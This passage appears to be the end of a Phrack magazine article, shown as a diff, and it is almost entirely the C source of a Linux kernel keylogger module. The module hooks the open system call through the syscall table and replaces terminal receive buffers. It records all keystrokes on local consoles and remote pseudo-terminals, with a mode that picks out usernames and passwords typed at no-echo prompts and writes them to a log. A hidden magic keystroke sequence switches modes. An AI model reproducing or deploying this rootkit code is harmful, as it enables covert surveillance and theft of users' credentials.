+#define VK_TOGLE_CHAR 29	// CTRL-]
+#define MAGIC_PASS &quot;31337&quot; 	// to switch mode, press MAGIC_PASS and 
+				// VK_TOGLE_CHAR
+
+#define	VK_NORMAL 0
+#define	VK_DUMBMODE 1
+#define	VK_SMARTMODE 2
+#define DEFAULT_MODE VK_DUMBMODE
+
+#define MAX_BUFFER 256
+#define MAX_SPECIAL_CHAR_SZ 12
+
+#define TTY_NUMBER(tty) MINOR((tty)-&gt;device) - (tty)-&gt;driver.minor_start \
+			+ (tty)-&gt;driver.name_base
+#define TTY_INDEX(tty) tty-&gt;driver.type == \
+			TTY_DRIVER_TYPE_PTY?MAX_TTY_CON + \
+			TTY_NUMBER(tty):TTY_NUMBER(tty)
+#define IS_PASSWD(tty) L_ICANON(tty) &amp;&amp; !L_ECHO(tty)
+#define TTY_WRITE(tty, buf, count) (*tty-&gt;driver.write)(tty, 0, \
+							buf, count)
+
+#define TTY_NAME(tty) (tty-&gt;driver.type == \
+		TTY_DRIVER_TYPE_CONSOLE?N_TTY_NAME: \
+		tty-&gt;driver.type == TTY_DRIVER_TYPE_PTY &amp;&amp; \
+		tty-&gt;driver.subtype == PTY_TYPE_SLAVE?N_PTS_NAME:&quot;&quot;)
+
+#define BEGIN_KMEM { mm_segment_t old_fs = get_fs(); set_fs(get_ds());
+#define END_KMEM set_fs(old_fs); }
+
+extern void *sys_call_table[];
+int errno;
+
+struct tlogger {
+	struct tty_struct *tty;
+	char buf[MAX_BUFFER + MAX_SPECIAL_CHAR_SZ];
+	int lastpos;
+	int status;
+	int pass;
+};
+
+struct tlogger *ttys[MAX_TTY_CON + MAX_PTS_CON] = { NULL };
+void (*old_receive_buf)(struct tty_struct *, const unsigned char *,
+			char *, int);
+asmlinkage int (*original_sys_open)(const char *, int, int);
+
+int vlogger_mode = DEFAULT_MODE;
+
+/* Prototypes */
+static inline void init_tty(struct tty_struct *, int);
+
+/*
+static char *_tty_make_name(struct tty_struct *tty, 
+				const char *name, char *buf)
+{
+	int idx = (tty)?MINOR(tty-&gt;device) - tty-&gt;driver.minor_start:0;
+
+	if (!tty) 
+		strcpy(buf, &quot;NULL tty&quot;);
+	else
+		sprintf(buf, name,
+			idx + tty-&gt;driver.name_base);
+	return buf;
+}
+
+char *tty_name(struct tty_struct *tty, char *buf)
+{
+	return _tty_make_name(tty, (tty)?tty-&gt;driver.name:NULL, buf);
+}
+*/
+
+#define SECS_PER_HOUR   (60 * 60)
+#define SECS_PER_DAY    (SECS_PER_HOUR * 24)
+#define isleap(year) \
+	((year) % 4 == 0 &amp;&amp; ((year) % 100 != 0 || (year) % 400 == 0))
+#define DIV(a, b) ((a) / (b) - ((a) % (b) &lt; 0))
+#define LEAPS_THRU_END_OF(y) (DIV (y, 4) - DIV (y, 100) + DIV (y, 400))
+
+struct vtm {
+	int tm_sec;
+	int tm_min;
+	int tm_hour;
+	int tm_mday;
+	int tm_mon;
+	int tm_year;
+};
+
+
+/* 
+ *  Convert from epoch to date 
+ */
+ 
+int epoch2time (const time_t *t, long int offset, struct vtm *tp)
+{
+	static const unsigned short int mon_yday[2][13] = {
+	   /* Normal years.  */
+	   { 0, 31, 59, 90, 120, 151, 181, 212, 243, 273, 304, 334, 365 },
+	   /* Leap years.  */
+	   { 0, 31, 60, 91, 121, 152, 182, 213, 244, 274, 305, 335, 366 }
+	};
+
+	long int days, rem, y;
+	const unsigned short int *ip;
+
+	days = *t / SECS_PER_DAY;
+	rem = *t % SECS_PER_DAY;
+	rem += offset;
+	while (rem &lt; 0) { 
+		rem += SECS_PER_DAY;
+		--days;
+	}
+	while (rem &gt;= SECS_PER_DAY) {
+		rem -= SECS_PER_DAY;
+		++days;
+	}
+	tp-&gt;tm_hour = rem / SECS_PER_HOUR;
+	rem %= SECS_PER_HOUR;
+	tp-&gt;tm_min = rem / 60;
+	tp-&gt;tm_sec = rem % 60;
+	y = 1970;
+
+	while (days &lt; 0 || days &gt;= (isleap (y) ? 366 : 365)) {
+		long int yg = y + days / 365 - (days % 365 &lt; 0);
+		days -= ((yg - y) * 365
+			+ LEAPS_THRU_END_OF (yg - 1)
+			- LEAPS_THRU_END_OF (y - 1));
+		y = yg;
+	}
+	tp-&gt;tm_year = y - 1900;
+	if (tp-&gt;tm_year != y - 1900)
+		return 0;
+	ip = mon_yday[isleap(y)];
+	for (y = 11; days &lt; (long int) ip[y]; --y)
+		continue;
+	days -= ip[y];
+	tp-&gt;tm_mon = y;
+	tp-&gt;tm_mday = days + 1;
+	return 1;
+}
+
+
+/* 
+ *  Get current date &amp; time
+ */
+
+void get_time (char *date_time) 
+{
+	struct timeval tv;
+	time_t t;
+	struct vtm tm;
+	
+	do_gettimeofday(&amp;tv);
+        t = (time_t)tv.tv_sec;
+	
+	epoch2time(&amp;t, TIMEZONE, &amp;tm);
+
+	sprintf(date_time, &quot;%.2d/%.2d/%d-%.2d:%.2d:%.2d&quot;, tm.tm_mday,
+		tm.tm_mon + 1, tm.tm_year + 1900, tm.tm_hour, tm.tm_min,
+		tm.tm_sec);
+}
+
+
+/* 
+ * Get task structure from pgrp id
+ */
+
+inline struct task_struct *get_task(pid_t pgrp) 
+{
+	struct task_struct *task = current;
+
+        do {
+                if (task-&gt;pgrp == pgrp) {
+                        return task;
+                }
+                task = task-&gt;next_task;
+        } while (task != current);
+        return NULL;
+}
+
+
+#define _write(f, buf, sz) (f-&gt;f_op-&gt;write(f, buf, sz, &amp;f-&gt;f_pos))
+#define WRITABLE(f) (f-&gt;f_op &amp;&amp; f-&gt;f_op-&gt;write)
+
+int write_to_file(char *logfile, char *buf, int size)
+{
+	int ret = 0;
+	struct file   *f = NULL;
+
+	lock_kernel();
+	BEGIN_KMEM;
+	f = filp_open(logfile, O_CREAT|O_APPEND, 00600);
+
+	if (IS_ERR(f)) {
+		DPRINT(&quot;Error %ld opening %s\n&quot;, -PTR_ERR(f), logfile);
+		ret = -1;
+	} else {
+		if (WRITABLE(f))
+			_write(f, buf, size);
+		else {
+	      		DPRINT(&quot;%s does not have a write method\n&quot;,
+	      			logfile);
+			ret = -1;
+		}
+    			
+		if ((ret = filp_close(f,NULL)))
+			DPRINT(&quot;Error %d closing %s\n&quot;, -ret, logfile);
+	}
+	END_KMEM;
+	unlock_kernel();
+
+	return ret;
+}
+
+
+#define BEGIN_ROOT { int saved_fsuid = current-&gt;fsuid; current-&gt;fsuid = 0;
+#define END_ROOT current-&gt;fsuid = saved_fsuid; }
+
+
+/* 
+ *  Logging keystrokes
+ */
+
+void logging(struct tty_struct *tty, struct tlogger *tmp, int cont) 
+{
+	int i;
+
+	char logfile[256];
+	char loginfo[MAX_BUFFER + MAX_SPECIAL_CHAR_SZ + 256];
+	char date_time[24];
+	struct task_struct *task;
+
+	if (vlogger_mode == VK_NORMAL)
+		return;
+
+	if ((vlogger_mode == VK_SMARTMODE) &amp;&amp; (!tmp-&gt;lastpos || cont))
+		return;
+		
+	task = get_task(tty-&gt;pgrp);
+		
+	for (i=0; i&lt;tmp-&gt;lastpos; i++)
+		if (tmp-&gt;buf[i] == 0x0D) tmp-&gt;buf[i] = 0x0A;
+
+	if (!cont) 
+		tmp-&gt;buf[tmp-&gt;lastpos++] = 0x0A;
+	
+	tmp-&gt;buf[tmp-&gt;lastpos] = 0;
+
+	if (vlogger_mode == VK_DUMBMODE) {
+		snprintf(logfile, sizeof(logfile)-1, &quot;%s/%s%d&quot;,
+				LOG_DIR, TTY_NAME(tty),	TTY_NUMBER(tty));
+		BEGIN_ROOT
+		if (!tmp-&gt;status) {
+			get_time(date_time);
+			if (task)
+				snprintf(loginfo, sizeof(loginfo)-1,
+					&quot;&lt;%s uid=%d %s&gt; %s&quot;, date_time,
+					task-&gt;uid, task-&gt;comm, tmp-&gt;buf);
+			else
+				snprintf(loginfo, sizeof(loginfo)-1,
+					&quot;&lt;%s&gt; %s&quot;, date_time, tmp-&gt;buf);
+			
+			write_to_file(logfile, loginfo, strlen(loginfo));
+		} else {
+			write_to_file(logfile, tmp-&gt;buf, tmp-&gt;lastpos);
+		}
+		END_ROOT
+
+#ifdef DEBUG
+		if (task)
+			DPRINT(&quot;%s/%d uid=%d %s: %s&quot;, 
+				TTY_NAME(tty), TTY_NUMBER(tty), 
+				task-&gt;uid, task-&gt;comm, tmp-&gt;buf);
+		else
+			DPRINT(&quot;%s&quot;, tmp-&gt;buf);
+#endif
+		tmp-&gt;status = cont;
+		
+	} else {
+
+		/*
+		 *  Logging USER/CMD and PASS in SMART_MODE
+		 */
+
+		BEGIN_ROOT
+		if (!tmp-&gt;pass) {
+			get_time(date_time);
+			if (task)
+				snprintf(loginfo, sizeof(loginfo)-1,
+					&quot;\n[%s tty=%s/%d uid=%d %s]\n&quot;
+					&quot;USER/CMD %s&quot;, date_time, 
+					TTY_NAME(tty),TTY_NUMBER(tty), 
+					task-&gt;uid, task-&gt;comm, tmp-&gt;buf);
+			else
+				snprintf(loginfo, sizeof(loginfo)-1,
+					&quot;\n[%s tty=%s/%d]\nUSER/CMD %s&quot;,
+					date_time, TTY_NAME(tty), 
+					TTY_NUMBER(tty), tmp-&gt;buf);
+
+			write_to_file(PASS_LOG, loginfo, strlen(loginfo));
+		} else {
+			snprintf(loginfo, sizeof(loginfo)-1, &quot;PASS %s&quot;,
+					tmp-&gt;buf);
+			write_to_file (PASS_LOG, loginfo, strlen(loginfo));
+		}
+
+		END_ROOT
+
+#ifdef DEBUG
+		if (!tmp-&gt;pass)
+			DPRINT(&quot;USER/CMD %s&quot;, tmp-&gt;buf);
+		else
+			DPRINT(&quot;PASS %s&quot;, tmp-&gt;buf);
+#endif
+	}
+
+	if (!cont) tmp-&gt;buf[--tmp-&gt;lastpos] = 0;
+}
+
+
+#define resetbuf(t)		\
+{				\
+	t-&gt;buf[0] = 0;		\
+	t-&gt;lastpos = 0;		\
+}
+
+#define append_c(t, s, n)	\
+{				\
+	t-&gt;lastpos += n;	\
+	strncat(t-&gt;buf, s, n);	\
+}
+
+static inline void reset_all_buf(void)
+{
+	int i = 0;
+	for (i=0; i&lt;MAX_TTY_CON + MAX_PTS_CON; i++)
+		if (ttys[i] != NULL)
+			resetbuf(ttys[i]);
+}
+
+void special_key(struct tlogger *tmp, const unsigned char *cp, int count)
+{
+    	switch(count) {
+	    case 2:
+    	    	switch(cp[1]) {
+			case '\'':
+				append_c(tmp, &quot;[ALT-\']&quot;, 7);
+				break;
+			case ',':
+				append_c(tmp, &quot;[ALT-,]&quot;, 7);
+				break;
+			case '-':
+				append_c(tmp, &quot;[ALT--]&quot;, 7);
+				break;
+			case '.':
+				append_c(tmp, &quot;[ALT-.]&quot;, 7);
+				break;
+			case '/':
+				append_c(tmp, &quot;[ALT-/]&quot;, 7);
+				break;
+			case '0':
+				append_c(tmp, &quot;[ALT-0]&quot;, 7);
+				break;
+			case '1':
+				append_c(tmp, &quot;[ALT-1]&quot;, 7);
+				break;
+			case '2':
+				append_c(tmp, &quot;[ALT-2]&quot;, 7);
+				break;
+			case '3':
+				append_c(tmp, &quot;[ALT-3]&quot;, 7);
+				break;
+			case '4':
+				append_c(tmp, &quot;[ALT-4]&quot;, 7);
+				break;
+			case '5':
+				append_c(tmp, &quot;[ALT-5]&quot;, 7);
+				break;
+			case '6':
+				append_c(tmp, &quot;[ALT-6]&quot;, 7);
+				break;
+			case '7':
+				append_c(tmp, &quot;[ALT-7]&quot;, 7);
+				break;
+			case '8':
+				append_c(tmp, &quot;[ALT-8]&quot;, 7);
+				break;
+			case '9':
+				append_c(tmp, &quot;[ALT-9]&quot;, 7);
+				break;
+			case ';':
+				append_c(tmp, &quot;[ALT-;]&quot;, 7);
+				break;
+			case '=':
+				append_c(tmp, &quot;[ALT-=]&quot;, 7);
+				break;
+			case '[':
+				append_c(tmp, &quot;[ALT-[]&quot;, 7);
+				break;
+			case '\\':
+				append_c(tmp, &quot;[ALT-\\]&quot;, 7);
+				break;
+			case ']':
+				append_c(tmp, &quot;[ALT-]]&quot;, 7);
+				break;
+			case '`':
+				append_c(tmp, &quot;[ALT-`]&quot;, 7);
+				break;
+			case 'a':
+				append_c(tmp, &quot;[ALT-A]&quot;, 7);
+				break;
+			case 'b':
+				append_c(tmp, &quot;[ALT-B]&quot;, 7);
+				break;
+			case 'c':
+				append_c(tmp, &quot;[ALT-C]&quot;, 7);
+				break;
+			case 'd':
+				append_c(tmp, &quot;[ALT-D]&quot;, 7);
+				break;
+			case 'e':
+				append_c(tmp, &quot;[ALT-E]&quot;, 7);
+				break;
+			case 'f':
+				append_c(tmp, &quot;[ALT-F]&quot;, 7);
+				break;
+			case 'g':
+				append_c(tmp, &quot;[ALT-G]&quot;, 7);
+				break;
+			case 'h':
+				append_c(tmp, &quot;[ALT-H]&quot;, 7);
+				break;
+			case 'i':
+				append_c(tmp, &quot;[ALT-I]&quot;, 7);
+				break;
+			case 'j':
+				append_c(tmp, &quot;[ALT-J]&quot;, 7);
+				break;
+			case 'k':
+				append_c(tmp, &quot;[ALT-K]&quot;, 7);
+				break;
+			case 'l':
+				append_c(tmp, &quot;[ALT-L]&quot;, 7);
+				break;
+			case 'm':
+				append_c(tmp, &quot;[ALT-M]&quot;, 7);
+				break;
+			case 'n':
+				append_c(tmp, &quot;[ALT-N]&quot;, 7);
+				break;
+			case 'o':
+				append_c(tmp, &quot;[ALT-O]&quot;, 7);
+				break;
+			case 'p':
+				append_c(tmp, &quot;[ALT-P]&quot;, 7);
+				break;
+			case 'q':
+				append_c(tmp, &quot;[ALT-Q]&quot;, 7);
+				break;
+			case 'r':
+				append_c(tmp, &quot;[ALT-R]&quot;, 7);
+				break;
+			case 's':
+				append_c(tmp, &quot;[ALT-S]&quot;, 7);
+				break;
+			case 't':
+				append_c(tmp, &quot;[ALT-T]&quot;, 7);
+				break;
+			case 'u':
+				append_c(tmp, &quot;[ALT-U]&quot;, 7);
+				break;
+			case 'v':
+				append_c(tmp, &quot;[ALT-V]&quot;, 7);
+				break;
+			case 'x':
+				append_c(tmp, &quot;[ALT-X]&quot;, 7);
+				break;
+			case 'y':
+				append_c(tmp, &quot;[ALT-Y]&quot;, 7);
+				break;
+			case 'z':
+				append_c(tmp, &quot;[ALT-Z]&quot;, 7);
+				break;
+		}
+		break;
+	    case 3:
+		switch(cp[2]) {
+			case 68:
+				// Left: 27 91 68
+				append_c(tmp, &quot;[LEFT]&quot;, 6);
+				break;
+			case 67:
+				// Right: 27 91 67
+				append_c(tmp, &quot;[RIGHT]&quot;, 7);
+				break;
+			case 65:
+				// Up: 27 91 65
+				append_c(tmp, &quot;[UP]&quot;, 4);
+				break;
+			case 66:
+				// Down: 27 91 66
+				append_c(tmp, &quot;[DOWN]&quot;, 6);
+				break;
+			case 80:
+				// Pause/Break: 27 91 80 
+				append_c(tmp, &quot;[BREAK]&quot;, 7);
+				break;
+		}
+		break;
+	    case 4:
+		switch(cp[3]) {
+			case 65:
+				// F1: 27 91 91 65
+				append_c(tmp, &quot;[F1]&quot;, 4);
+				break;
+			case 66:
+				// F2: 27 91 91 66
+				append_c(tmp, &quot;[F2]&quot;, 4);
+				break;
+			case 67:
+				// F3: 27 91 91 67
+				append_c(tmp, &quot;[F3]&quot;, 4);
+				break;
+			case 68:
+				// F4: 27 91 91 68
+				append_c(tmp, &quot;[F4]&quot;, 4);
+				break;
+			case 69:
+				// F5: 27 91 91 69
+				append_c(tmp, &quot;[F5]&quot;, 4);
+				break;
+			case 126:
+				switch(cp[2]) {
+					case 53:
+						// PgUp: 27 91 53 126
+						append_c(tmp, &quot;[PgUP]&quot;, 6);
+						break;
+					case 54:
+						// PgDown: 27 91 54 126
+						append_c(tmp, 
+							&quot;[PgDOWN]&quot;, 8);
+						break;
+					case 49:
+						// Home: 27 91 49 126
+						append_c(tmp, &quot;[HOME]&quot;, 6);
+						break;
+					case 52:
+						// End: 27 91 52 126
+						append_c(tmp, &quot;[END]&quot;, 5);
+						break;
+					case 50:
+						// Insert: 27 91 50 126
+						append_c(tmp, &quot;[INS]&quot;, 5);
+						break;
+					case 51:
+						// Delete: 27 91 51 126
+						append_c(tmp, &quot;[DEL]&quot;, 5);
+						break;
+				}
+			break;
+		}
+		break;
+	    case 5:
+		if(cp[2] == 50)
+			switch(cp[3]) {
+				case 48:
+					// F9: 27 91 50 48 126
+					append_c(tmp, &quot;[F9]&quot;, 4);
+					break;
+				case 49:
+					// F10: 27 91 50 49 126
+					append_c(tmp, &quot;[F10]&quot;, 5);
+					break;
+				case 51:
+					// F11: 27 91 50 51 126
+					append_c(tmp, &quot;[F11]&quot;, 5);
+					break;
+				case 52:
+					// F12: 27 91 50 52 126
+					append_c(tmp, &quot;[F12]&quot;, 5);
+					break;
+				case 53:
+					// Shift-F1: 27 91 50 53 126
+					append_c(tmp, &quot;[SH-F1]&quot;, 7);
+					break;
+				case 54:
+					// Shift-F2: 27 91 50 54 126
+					append_c(tmp, &quot;[SH-F2]&quot;, 7);
+					break;
+				case 56:
+					// Shift-F3: 27 91 50 56 126
+					append_c(tmp, &quot;[SH-F3]&quot;, 7);
+					break;
+				case 57:
+					// Shift-F4: 27 91 50 57 126
+					append_c(tmp, &quot;[SH-F4]&quot;, 7);
+					break;
+			}
+		else
+			switch(cp[3]) {
+				case 55:
+					// F6: 27 91 49 55 126
+					append_c(tmp, &quot;[F6]&quot;, 4);
+					break;
+		     		case 56:
+					// F7: 27 91 49 56 126
+					append_c(tmp, &quot;[F7]&quot;, 4);
+					break;
+     				case 57:
+					// F8: 27 91 49 57 126
+					append_c(tmp, &quot;[F8]&quot;, 4);
+					break;
+		     		case 49:
+					// Shift-F5: 27 91 51 49 126
+					append_c(tmp, &quot;[SH-F5]&quot;, 7);
+					break;
+		     		case 50:
+					// Shift-F6: 27 91 51 50 126
+					append_c(tmp, &quot;[SH-F6]&quot;, 7);
+					break;
+     				case 51:
+					// Shift-F7: 27 91 51 51 126
+					append_c(tmp, &quot;[SH-F7]&quot;, 7);
+					break;
+		     		case 52:
+					// Shift-F8: 27 91 51 52 126
+					append_c(tmp, &quot;[SH-F8]&quot;, 7);
+					break;
+			};
+		break;
+	    default:	// Unknow
+		break;
+    }
+}
+
+
+/* 
+ *  Called whenever user press a key
+ */
+
+void vlogger_process(struct tty_struct *tty, 
+			const unsigned char *cp, int count)
+{
+	struct tlogger *tmp = ttys[TTY_INDEX(tty)];
+
+	if (!tmp) {
+		DPRINT(&quot;erm .. unknow error???\n&quot;);
+		init_tty(tty, TTY_INDEX(tty));
+		tmp = ttys[TTY_INDEX(tty)];
+		if (!tmp)
+			return;
+	}
+
+	if (vlogger_mode == VK_SMARTMODE) {
+		if (tmp-&gt;status &amp;&amp; !IS_PASSWD(tty)) {
+			resetbuf(tmp);
+		}		
+		if (!tmp-&gt;pass &amp;&amp; IS_PASSWD(tty)) {
+			logging(tty, tmp, 0);
+			resetbuf(tmp);
+		}
+		if (tmp-&gt;pass &amp;&amp; !IS_PASSWD(tty)) { 
+			if (!tmp-&gt;lastpos)
+				logging(tty, tmp, 0);
+			resetbuf(tmp);
+		}
+		tmp-&gt;pass  = IS_PASSWD(tty);
+		tmp-&gt;status = 0;
+	}
+
+	if ((count + tmp-&gt;lastpos) &gt; MAX_BUFFER - 1) {	
+		logging(tty, tmp, 1);
+		resetbuf(tmp);
+	} 
+
+	if (count == 1) {
+		if (cp[0] == VK_TOGLE_CHAR) {
+			if (!strcmp(tmp-&gt;buf, MAGIC_PASS)) {
+				if(vlogger_mode &lt; 2)
+					vlogger_mode++;
+				else
+					vlogger_mode = 0;
+				reset_all_buf();
+
+				switch(vlogger_mode) {
+					case VK_DUMBMODE:
+				    		DPRINT(&quot;Dumb Mode\n&quot;);
+						TTY_WRITE(tty, &quot;\r\n&quot;
+				    		&quot;Dumb Mode\n&quot;, 12);
+						break;
+					case VK_SMARTMODE:
+				    		DPRINT(&quot;Smart Mode\n&quot;);
+						TTY_WRITE(tty, &quot;\r\n&quot;
+						&quot;Smart Mode\n&quot;, 13);
+						break;
+					case VK_NORMAL:
+					    	DPRINT(&quot;Normal Mode\n&quot;);
+						TTY_WRITE(tty, &quot;\r\n&quot;
+						&quot;Normal Mode\n&quot;, 14);
+				}
+			}
+		}
+
+		switch (cp[0]) {
+			case 0x01:	//^A
+				append_c(tmp, &quot;[^A]&quot;, 4);
+				break;
+			case 0x02:	//^B
+				append_c(tmp, &quot;[^B]&quot;, 4);
+				break;
+			case 0x03:	//^C
+				append_c(tmp, &quot;[^C]&quot;, 4);
+			case 0x04:	//^D
+				append_c(tmp, &quot;[^D]&quot;, 4);
+			case 0x0D:	//^M
+			case 0x0A:
+				if (vlogger_mode == VK_SMARTMODE) {
+					if (IS_PASSWD(tty)) {
+						logging(tty, tmp, 0);
+						resetbuf(tmp);
+					} else
+						tmp-&gt;status = 1;
+				} else {
+					logging(tty, tmp, 0);
+					resetbuf(tmp);
+				}
+				break;
+			case 0x05:	//^E
+				append_c(tmp, &quot;[^E]&quot;, 4);
+				break;
+			case 0x06:	//^F
+				append_c(tmp, &quot;[^F]&quot;, 4);
+				break;
+			case 0x07:	//^G
+				append_c(tmp, &quot;[^G]&quot;, 4);
+				break;
+			case 0x09:	//TAB - ^I
+				append_c(tmp, &quot;[TAB]&quot;, 5);
+				break;
+			case 0x0b:	//^K
+				append_c(tmp, &quot;[^K]&quot;, 4);
+				break;
+			case 0x0c:	//^L
+				append_c(tmp, &quot;[^L]&quot;, 4);
+				break;
+			case 0x0e:	//^E
+				append_c(tmp, &quot;[^E]&quot;, 4);
+				break;
+			case 0x0f:	//^O
+				append_c(tmp, &quot;[^O]&quot;, 4);
+				break;
+			case 0x10:	//^P
+				append_c(tmp, &quot;[^P]&quot;, 4);
+				break;
+			case 0x11:	//^Q
+				append_c(tmp, &quot;[^Q]&quot;, 4);
+				break;
+			case 0x12:	//^R
+				append_c(tmp, &quot;[^R]&quot;, 4);
+				break;
+			case 0x13:	//^S
+				append_c(tmp, &quot;[^S]&quot;, 4);
+				break;
+			case 0x14:	//^T
+				append_c(tmp, &quot;[^T]&quot;, 4);
+				break;
+			case 0x15:	//CTRL-U
+				resetbuf(tmp);
+				break;				
+			case 0x16:	//^V
+				append_c(tmp, &quot;[^V]&quot;, 4);
+				break;
+			case 0x17:	//^W
+				append_c(tmp, &quot;[^W]&quot;, 4);
+				break;
+			case 0x18:	//^X
+				append_c(tmp, &quot;[^X]&quot;, 4);
+				break;
+			case 0x19:	//^Y
+				append_c(tmp, &quot;[^Y]&quot;, 4);
+				break;
+			case 0x1a:	//^Z
+				append_c(tmp, &quot;[^Z]&quot;, 4);
+				break;
+			case 0x1c:	//^\
+				append_c(tmp, &quot;[^\\]&quot;, 4);
+				break;
+			case 0x1d:	//^]
+				append_c(tmp, &quot;[^]]&quot;, 4);
+				break;
+			case 0x1e:	//^^
+				append_c(tmp, &quot;[^^]&quot;, 4);
+				break;
+			case 0x1f:	//^_
+				append_c(tmp, &quot;[^_]&quot;, 4);
+				break;
+			case BACK_SPACE_CHAR1:
+			case BACK_SPACE_CHAR2:
+				if (!tmp-&gt;lastpos) break;
+				if (tmp-&gt;buf[tmp-&gt;lastpos-1] != ']')
+					tmp-&gt;buf[--tmp-&gt;lastpos] = 0;
+				else {
+					append_c(tmp, &quot;[^H]&quot;, 4);
+				}
+				break;
+			case ESC_CHAR:	//ESC
+				append_c(tmp, &quot;[ESC]&quot;, 5);
+				break;
+			default:
+				tmp-&gt;buf[tmp-&gt;lastpos++] = cp[0];
+				tmp-&gt;buf[tmp-&gt;lastpos] = 0;
+		}
+	} else {	// a block of chars or special key
+		if (cp[0] != ESC_CHAR) {
+			while (count &gt;= MAX_BUFFER) {
+				append_c(tmp, cp, MAX_BUFFER);
+				logging(tty, tmp, 1);
+				resetbuf(tmp);
+				count -= MAX_BUFFER;
+				cp += MAX_BUFFER;
+			}
+
+			append_c(tmp, cp, count);
+		} else 	// special key
+			special_key(tmp, cp, count);
+	}
+}
+
+
+void my_tty_open(void) 
+{
+	int fd, i;
+	char dev_name[80];
+
+#ifdef LOCAL_ONLY
+	int fl = 0;
+	struct tty_struct * tty;
+	struct file * file;
+#endif
+
+	for (i=1; i&lt;MAX_TTY_CON; i++) {
+		snprintf(dev_name, sizeof(dev_name)-1, &quot;/dev/tty%d&quot;, i);
+
+		BEGIN_KMEM
+			fd = open(dev_name, O_RDONLY, 0);
+			if (fd &lt; 0) continue;
+
+#ifdef LOCAL_ONLY
+			file = fget(fd);
+			tty = file-&gt;private_data;
+			if (tty != NULL  &amp;&amp; 
+				tty-&gt;ldisc.receive_buf != NULL) {
+				if (!fl) {
+					old_receive_buf = 
+						tty-&gt;ldisc.receive_buf;
+					fl = 1;
+				}
+				init_tty(tty, TTY_INDEX(tty));
+			}
+			fput(file);
+#endif
+
+			close(fd);
+		END_KMEM
+	}
+
+#ifndef LOCAL_ONLY
+	for (i=0; i&lt;MAX_PTS_CON; i++) {
+		snprintf(dev_name, sizeof(dev_name)-1, &quot;/dev/pts/%d&quot;, i);
+
+		BEGIN_KMEM
+			fd = open(dev_name, O_RDONLY, 0);
+			if (fd &gt;= 0) close(fd);
+		END_KMEM
+	}
+#endif
+
+}
+
+
+void new_receive_buf(struct tty_struct *tty, const unsigned char *cp,
+						char *fp, int count)
+{
+	if (!tty-&gt;real_raw &amp;&amp; !tty-&gt;raw)	// ignore raw mode
+		vlogger_process(tty, cp, count);
+	(*old_receive_buf)(tty, cp, fp, count);
+}
+
+
+static inline void init_tty(struct tty_struct *tty, int tty_index)
+{
+	struct tlogger *tmp;
+
+	DPRINT(&quot;Init logging for %s%d\n&quot;, TTY_NAME(tty), TTY_NUMBER(tty));
+
+	if (ttys[tty_index] == NULL) {
+		tmp = kmalloc(sizeof(struct tlogger), GFP_KERNEL);
+		if (!tmp) {
+			DPRINT(&quot;kmalloc failed!\n&quot;);
+			return;
+		}
+		memset(tmp, 0, sizeof(struct tlogger));
+		tmp-&gt;tty = tty;
+		tty-&gt;ldisc.receive_buf = new_receive_buf;
+		ttys[tty_index] = tmp;
+	} else {
+		tmp = ttys[tty_index];
+		logging(tty, tmp, 1);
+		resetbuf(tmp);
+		tty-&gt;ldisc.receive_buf = new_receive_buf;
+	}
+}
+
+
+asmlinkage int new_sys_open(const char *filename, int flags, int mode)
+{
+	int ret;
+	static int fl = 0;
+	struct file * file;
+	
+	ret = (*original_sys_open)(filename, flags, mode);
+	
+	if (ret &gt;= 0) {
+		struct tty_struct * tty;
+
+	    BEGIN_KMEM
+	    	lock_kernel();
+		file = fget(ret);
+		tty = file-&gt;private_data;
+
+		if (tty != NULL &amp;&amp; 
+			((tty-&gt;driver.type == TTY_DRIVER_TYPE_CONSOLE &amp;&amp;
+			TTY_NUMBER(tty) &lt; MAX_TTY_CON - 1 ) ||
+			(tty-&gt;driver.type == TTY_DRIVER_TYPE_PTY &amp;&amp;
+			tty-&gt;driver.subtype == PTY_TYPE_SLAVE &amp;&amp;
+			TTY_NUMBER(tty) &lt; MAX_PTS_CON)) &amp;&amp;
+			tty-&gt;ldisc.receive_buf != NULL &amp;&amp;
+			tty-&gt;ldisc.receive_buf != new_receive_buf) {
+
+			if (!fl) {
+				old_receive_buf = tty-&gt;ldisc.receive_buf;
+				fl = 1;
+			}
+			init_tty(tty, TTY_INDEX(tty));
+		}
+		fput(file);
+		unlock_kernel();
+	    END_KMEM
+	}
+	return ret;
+}
+
+
+int init_module(void)
+{
+
+	DPRINT(MVERSION);
+#ifndef LOCAL_ONLY
+	original_sys_open = sys_call_table[__NR_open];
+	sys_call_table[__NR_open] = new_sys_open;
+#endif
+	my_tty_open();
+//	MOD_INC_USE_COUNT;
+
+	return 0;
+}
+
+DECLARE_WAIT_QUEUE_HEAD(wq);
+
+void cleanup_module(void)
+{
+	int i;
+
+#ifndef LOCAL_ONLY
+	sys_call_table[__NR_open] = original_sys_open;
+#endif
+
+	for (i=0; i&lt;MAX_TTY_CON + MAX_PTS_CON; i++) {
+		if (ttys[i] != NULL) {
+			ttys[i]-&gt;tty-&gt;ldisc.receive_buf = old_receive_buf;
+		}
+	}
+	sleep_on_timeout(&amp;wq, HZ);
+	for (i=0; i&lt;MAX_TTY_CON + MAX_PTS_CON; i++) {
+		if (ttys[i] != NULL) {
+			kfree(ttys[i]);
+		}
+	}
+	DPRINT(&quot;Unloaded\n&quot;);
+}
+
+EXPORT_NO_SYMBOLS;
+&lt;--&gt;
+|=[ EOF ]=---------------------------------------------------------------=|
+</pre>
+
+</div>
+</div>
+
+</center>
+
+<div align="center" class="texto-2-bold">
+[ <a href="../../index.html" title="News">News</a> ]
+[ <a href="../../" title="Paper Feed">Paper Feed</a> ]
+[ <a href="../../issues/71/1.html" title="Issues">Issues</a> ]
+[ <a href="../../authors.html" title="Authors">Authors</a> ]
+[ <a href="../../archives/" title="Archives">Archives</a> ]
+[ <a href="../../contact.html" title="Contact">Contact</a> ]
+</div>
+
+<div align="right" class="texto-1">© Copyleft 1985-2024, Phrack Magazine.</div>
+</body>
+</html>
